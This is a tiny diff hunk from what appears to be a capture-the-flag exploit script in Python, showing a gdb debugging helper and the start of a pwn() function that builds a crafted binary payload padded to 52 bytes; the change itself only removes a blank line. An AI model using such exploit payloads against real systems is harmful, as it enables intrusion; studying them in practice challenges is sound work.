@@ -32,7 +32,6 @@ def B():
     gdb.attach(io)
     pause()
 
-
 def pwn():
     payload = b'\x13\x00\x00\x00\x12\x00\x00\x00\x07\x00\x00\x00\xff\xff\xfb\xfd\x06\x00\x00\x00'
     payload = payload.ljust(52, b'\x00')
